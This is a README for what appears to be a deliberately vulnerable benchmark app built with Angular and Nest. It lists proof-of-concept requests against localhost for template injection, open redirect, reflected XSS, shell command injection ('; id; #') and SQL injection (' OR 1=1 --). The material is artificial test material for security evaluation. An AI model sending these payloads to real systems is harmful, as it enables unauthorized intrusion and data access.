# App Project SaaS Starter Lite VulnBench 2.0 POCs

Install and run the Nx applications with:

```sh
npm install
npm run dev
```

The Angular client normally runs on `http://localhost:4200` and the Nest API
on `http://localhost:3000`.

## Nest invite template injection

The invite preview compiles caller-supplied Dot template syntax:

```sh
curl -sS -X POST http://localhost:3000/api/v1/auth/invite/preview \
  -H 'content-type: application/json' \
  --data '{"template":"Invite for {{= process.version }}"}'
```

## Nest open redirect

```text
http://localhost:3000/api/v1/auth/continue?next=https%3A%2F%2Fexample.com
```

## Nest/Angular invite XSS

Open the Angular registration page with a crafted invite name:

```text
http://localhost:4200/register?name=%3Cimg%20src%3Dx%20onerror%3Dalert(document.domain)%3E
```

The Angular page requests the Nest invite-message endpoint and renders the
response as trusted HTML.

## Admin export command injection

Use an authenticated admin-shaped bearer token:

```sh
curl -G http://localhost:3000/api/v1/users/export \
  -H 'authorization: Bearer <admin-access-token>' \
  --data-urlencode "format=csv'; id; #'"
```

## Admin export-search SQL injection

```sh
curl -G http://localhost:3000/api/v1/users/export/search \
  -H 'authorization: Bearer <admin-access-token>' \
  --data-urlencode "search=' OR 1=1 --"
```
